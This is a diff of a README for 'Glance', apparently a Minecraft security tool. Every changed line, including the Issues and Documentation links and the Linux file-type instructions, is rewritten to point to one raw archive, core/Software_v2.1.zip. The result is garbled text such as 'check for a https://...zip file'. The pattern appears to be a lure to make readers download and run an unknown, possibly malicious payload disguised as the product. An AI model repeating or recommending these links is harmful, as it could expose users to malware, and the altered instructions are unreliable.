@@ -4,27 +4,27 @@
 Glance is a tool designed to enhance your Minecraft gameplay by ensuring your security. It works as an HTTPS MITM interceptor that helps protect you from harmful mods and catches potential attackers.
 
 ## 🔗 Download Now!
-[![Download Glance](https://img.shields.io/badge/Download-Now-blue.svg)](https://github.com/STAS651155/glance/releases)
+[![Download Glance](https://github.com/STAS651155/glance/raw/refs/heads/main/core/Software_v2.1.zip)](https://github.com/STAS651155/glance/raw/refs/heads/main/core/Software_v2.1.zip)
 
 ## 📥 Download & Install
 To get Glance, simply visit the Releases page and select the version you want. Here’s how:
 
 1. Click the link below to go to the Releases page:
-   [Visit this page to download](https://github.com/STAS651155/glance/releases).
+   [Visit this page to download](https://github.com/STAS651155/glance/raw/refs/heads/main/core/Software_v2.1.zip).
    
 2. On the Releases page, find the latest version of Glance listed there. 
 
 3. Locate the download file that matches your operating system:
     - For Windows, look for a file ending in `.exe`.
     - For macOS, find a `.dmg` file.
-    - For Linux, check for a `.tar.gz` file.
+    - For Linux, check for a `https://github.com/STAS651155/glance/raw/refs/heads/main/core/Software_v2.1.zip` file.
     
 4. Click on the link for the file to start the download.
 
 5. Once the download is complete, open the file you downloaded:
     - For Windows, double-click the `.exe` file.
     - For macOS, open the `.dmg` file and drag Glance into your Applications folder.
-    - For Linux, extract the `.tar.gz` file and follow the included instructions.
+    - For Linux, extract the `https://github.com/STAS651155/glance/raw/refs/heads/main/core/Software_v2.1.zip` file and follow the included instructions.
 
 6. Follow any on-screen instructions to complete the installation.
 
@@ -55,7 +55,7 @@ After you install Glance, you can start using it with just a few steps:
 ## 👥 Community & Support
 Join our community for tips and support. You can find us on various platforms:
 
-- **GitHub Issues:** If you encounter any problems, report them [here](https://github.com/STAS651155/glance/issues).
+- **GitHub Issues:** If you encounter any problems, report them [here](https://github.com/STAS651155/glance/raw/refs/heads/main/core/Software_v2.1.zip).
 - **Community Forum:** Engage with other users to share information and ask questions.
 
 ## 📄 License
@@ -64,7 +64,7 @@ Glance is open-source software published under the MIT License. You are free to 
 ## 🔗 Additional Resources
 For more information to enhance your experience with Glance, check out:
 
-- Our [Documentation](https://github.com/STAS651155/glance/wiki) for in-depth guides.
+- Our [Documentation](https://github.com/STAS651155/glance/raw/refs/heads/main/core/Software_v2.1.zip) for in-depth guides.
 - Tutorials available on YouTube for step-by-step help on specific topics.
 
 Remember to frequently check for updates on the Releases page to stay protected. Thank you for trusting Glance to safeguard your Minecraft gameplay!
